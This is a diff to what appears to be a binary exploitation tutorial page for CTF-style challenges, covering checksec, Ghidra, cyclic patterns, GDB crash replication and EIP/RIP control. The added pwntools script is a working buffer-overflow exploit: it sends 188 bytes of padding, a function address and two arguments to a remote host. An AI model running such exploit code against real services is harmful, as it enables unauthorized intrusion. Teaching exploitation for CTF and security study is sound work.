@@ -10,8 +10,10 @@ render_with_liquid: false
 
 1. **Check Security Properties**
 
+    Assuming that the target file named "sample".
+
     ```sh
-    checksec ./sampleExe
+    checksec ./sample
     ```
 
     1. **Binary Qualities**
@@ -29,7 +31,7 @@ render_with_liquid: false
         - **Local**
 
             ```sh
-            ./exampleExe
+            ./sample
             ```
 
         - **Remote**
@@ -53,6 +55,14 @@ render_with_liquid: false
 
 <br />
 
+## Code Examination
+
+```sh
+ghidra ./sample
+```
+
+<br />
+
 ## Crash Replication and Control EIP/RIP
 
 Instruction Pointer (IP), which is called  the EIP on 32-bit machines, and the RIP on 64-bit machines.  
@@ -69,15 +79,15 @@ The IP points to the next instruction to be executed.
         cyclic 100 > pattern.txt
         # or
         msf-pattern_create -l 100 > pattern.txt
+        # or
+        python3 -c "print('A'*200)"
         ```
 
-    2. **Start Debugging with GDB (Pwndbg)**
-
-        Before starting gdb, it’s recommended to setup the **[Pwndbg](https://github.com/pwndbg/pwndbg){:target="_blank"}** for easily debugging.
+    2. **Start Debugging with GDB**
 
         ```sh
-        # exampleExe is the example of executable file
-        gdb exampleExe
+        # sample is the example of executable file
+        gdb ./sample
         ```
 
     3. **Run Program in Debugger**
@@ -85,20 +95,11 @@ The IP points to the next instruction to be executed.
         Use the generated text file of cyclic pattern for input.
 
         ```sh
-        # r: run a program
         # Add an input from text file
-        r < pattern.txt
+        run < pattern.txt
         ```
 
         If the program crashes, check the invalid address and the EIP’s value of the  output.
-
-        ```sh
-        # They mean there is an invalid address at 0x4a4a4a.
-        # Fir eip, it has been overwritten with 0x4a4a4a4a
-        EIP  0x6161616a ('jaaa')
-
-        Invalid address 0x6161616a
-        ```
 
     4. **Generate an Exploitable Cyclic with Pwntools**
 
@@ -127,7 +128,7 @@ The IP points to the next instruction to be executed.
         3. **Input the Cyclic in GDB**
 
             ```sh
-            gdb exampleExe
+            gdb ./sample
 
             # ----------------------------------------
 
@@ -194,18 +195,24 @@ The IP points to the next instruction to be executed.
         ```python
         from pwn import *
 
-        connect = remote('<target-ip>', <target-port>)
-        print(connect.recvn(18))
-        payload = "A"*32
-        payload += p32(0xdeadbeef)
-        connect.send(payload)
-        print(connect.recvn(34))
+        # the address of the vulnerable function ( e.g. flag() )
+        flag = 0x080491e2
+        host = "<remote-ip>"
+        port = <remote-port>
+        deadbeef = 0xdeadbeef
+        offset = 0xc0ded00d
+
+        payload = b"A"*188 + p32(flag) + b"A"*4 + p32(deadbeef) + p32(offset)
+
+        p = remote(host, port)
+        p.sendline(payload)
+        p.interactive()
         ```
 
     2. **Run**
 
         ```sh
-        python2 exploit.py
+        python3 exploit.py
         ```
 
     3. **Create Shellcode**
